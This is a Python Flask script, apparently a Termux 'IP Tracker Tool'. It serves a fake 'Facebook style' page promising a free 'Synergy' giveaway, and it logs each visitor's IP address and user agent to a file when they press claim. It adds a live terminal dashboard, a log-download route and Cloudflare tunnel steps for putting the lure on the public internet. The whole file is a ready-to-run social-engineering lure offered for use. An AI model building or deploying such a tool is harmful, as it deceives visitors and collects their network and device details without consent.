#!/usr/bin/env python3
import os
import sys
import argparse
import threading
import requests
from flask import Flask, render_template, request, jsonify, send_file
from datetime import datetime

app = Flask(__name__)

def get_visitor_ip():
    """Get the real IP address of the visitor"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def log_claim(ip_address, user_agent):
    """Log claim to logs.txt"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] CLAIMED - IP: {ip_address} | Agent: {user_agent}\n"
    
    try:
        with open('logs.txt', 'a', encoding='utf-8') as f:
            f.write(log_entry)
        return True
    except Exception as e:
        print(f"Error writing to log file: {e}")
        return False

def read_logs():
    """Read logs from logs.txt"""
    if not os.path.exists('logs.txt'):
        return []
    
    try:
        with open('logs.txt', 'r', encoding='utf-8') as f:
            logs = f.readlines()
        return [log.strip() for log in logs if log.strip()]
    except Exception as e:
        print(f"Error reading log file: {e}")
        return []

def get_stats():
    """Get statistics from logs"""
    logs = read_logs()
    total_claims = len([log for log in logs if 'CLAIMED' in log])
    
    today = datetime.now().strftime("%Y-%m-%d")
    today_claims = len([log for log in logs if today in log and 'CLAIMED' in log])
    
    return {
        'total_claims': total_claims,
        'today_claims': today_claims,
        'all_logs': logs
    }

@app.route('/')
def index():
    """Main page - Facebook style claim page"""
    stats = get_stats()
    return render_template('index.html', 
                         total_claims=stats['total_claims'],
                         today_claims=stats['today_claims'])

@app.route('/api/claim', methods=['POST'])
def api_claim():
    """API endpoint to handle claims"""
    visitor_ip = get_visitor_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Log the claim
    success = log_claim(visitor_ip, user_agent)
    
    if success:
        stats = get_stats()
        return jsonify({
            'success': True,
            'message': 'Free Synergy claimed successfully!',
            'your_ip': visitor_ip,
            'total_claims': stats['total_claims'],
            'today_claims': stats['today_claims'],
            'timestamp': datetime.now().isoformat()
        })
    else:
        return jsonify({
            'success': False,
            'message': 'Error processing claim'
        }), 500

@app.route('/api/stats')
def api_stats():
    """API endpoint to get statistics"""
    stats = get_stats()
    return jsonify(stats)

@app.route('/download_logs')
def download_logs():
    """Download logs.txt file"""
    if os.path.exists('logs.txt'):
        return send_file('logs.txt', as_attachment=True, download_name='synergy_claims_logs.txt')
    else:
        return "No logs found", 404

def get_local_ip():
    """Get local IP address"""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_public_ip():
    """Get public IP address"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except:
        return "Unable to get public IP"

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Display cool banner"""
    banner = """
    ╔═══════════════════════════════════════════╗
    ║           🚀 IP TRACKER TOOL 🚀           ║
    ║         Facebook Style IP Logger          ║
    ║              For Termux/Linux             ║
    ╚═══════════════════════════════════════════╝
    """
    print(banner)

def display_server_info(host, port, server_type):
    """Display server information"""
    local_ip = get_local_ip()
    public_ip = get_public_ip() if server_type == "cloudflare" else "N/A"
    
    print("📊 SERVER INFORMATION:")
    print(f"   🖥️  Server Type:  {server_type.upper()}")
    print(f"   🌐 Local URL:    http://127.0.0.1:{port}")
    
    if server_type == "local":
        print(f"   📱 Network URL:  http://{local_ip}:{port}")
    elif server_type == "cloudflare":
        print(f"   🌍 Public URL:   http://{public_ip}:{port}")
        print(f"   🔗 Cloudflare:   Ready for tunnel")
    
    print(f"   🔧 Port:         {port}")
    print(f"   📁 Logs File:    logs.txt")
    print()

def display_real_time_stats():
    """Display real-time statistics"""
    stats = get_stats()
    print("📈 REAL-TIME STATISTICS:")
    print(f"   📊 Total Claims: {stats['total_claims']}")
    print(f"   📅 Today:        {stats['today_claims']}")
    print(f"   📝 Log Entries:  {len(stats['all_logs'])}")
    print()

def display_help(server_type):
    """Display help information"""
    print("🎯 QUICK COMMANDS:")
    
    if server_type == "local":
        print("   📱 Open locally:    termux-open-url http://127.0.0.1:5000")
        print("   📋 Share locally:   termux-clipboard-set http://YOUR_LOCAL_IP:5000")
    elif server_type == "cloudflare":
        print("   🌐 Setup tunnel:    cloudflared tunnel --url http://localhost:5000")
        print("   📱 Open locally:    termux-open-url http://127.0.0.1:5000")
    
    print("   📊 View logs:        cat logs.txt")
    print("   🗑️  Clear logs:      rm logs.txt")
    print("   ⏹️  Stop server:     Ctrl+C")
    print()

def start_live_dashboard(host, port, server_type):
    """Start live dashboard in separate thread"""
    def dashboard_loop():
        import time
        while True:
            try:
                clear_screen()
                display_banner()
                display_server_info(host, port, server_type)
                display_real_time_stats()
                display_help(server_type)
                print("🔄 Live updating... (Ctrl+C to stop)")
                time.sleep(5)
            except KeyboardInterrupt:
                break
            except:
                pass
    
    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()

def setup_cloudflare_tunnel(port):
    """Setup Cloudflare tunnel instructions"""
    print("🌐 CLOUDFLARE TUNNEL SETUP:")
    print("1. Install Cloudflared:")
    print("   pkg install cloudflared")
    print()
    print("2. Create tunnel:")
    print("   cloudflared tunnel create ip-tracker")
    print()
    print("3. Configure tunnel:")
    print(f"   echo 'url: http://localhost:{port}' > ~/.cloudflared/config.yml")
    print()
    print("4. Run tunnel:")
    print("   cloudflared tunnel run ip-tracker")
    print()
    print("5. Your public URL will be shown in Cloudflared output")
    print()

def start_server(host='0.0.0.0', port=5000, debug=False, server_type="local"):
    """Start the Flask server with server selection"""
    # Create log file if it doesn't exist
    if not os.path.exists('logs.txt'):
        with open('logs.txt', 'w', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] SYNERGY CLAIM TRACKER STARTED - {server_type.upper()} MODE\n")
    
    clear_screen()
    display_banner()
    
    if server_type == "cloudflare":
        setup_cloudflare_tunnel(port)
    
    display_server_info(host, port, server_type)
    display_real_time_stats()
    display_help(server_type)
    
    # Start live dashboard
    start_live_dashboard(host, port, server_type)
    
    print("🚀 Starting server...")
    print("⏳ Please wait while the server starts...")
    print()
    
    try:
        app.run(host=host, port=port, debug=debug, use_reloader=False)
    except KeyboardInterrupt:
        print("\n\n🛑 Server stopped by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")

def main():
    """Main entry point with server selection"""
    parser = argparse.ArgumentParser(description='Facebook-style IP Tracker')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=5000, help='Port to run on (default: 5000)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--simple', action='store_true', help='Simple mode without live dashboard')
    parser.add_argument('--server', choices=['local', 'cloudflare'], default='local', 
                       help='Server type: local (127.0.0.1) or cloudflare (public)')
    
    args = parser.parse_args()
    
    try:
        if args.simple:
            # Simple mode without dashboard
            print(f"🚀 Starting IP Tracker in {args.server} mode...")
            app.run(host=args.host, port=args.port, debug=args.debug)
        else:
            # Full UI mode with server selection
            start_server(host=args.host, port=args.port, debug=args.debug, server_type=args.server)
    except KeyboardInterrupt:
        print("\n🛑 IP Tracker stopped")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
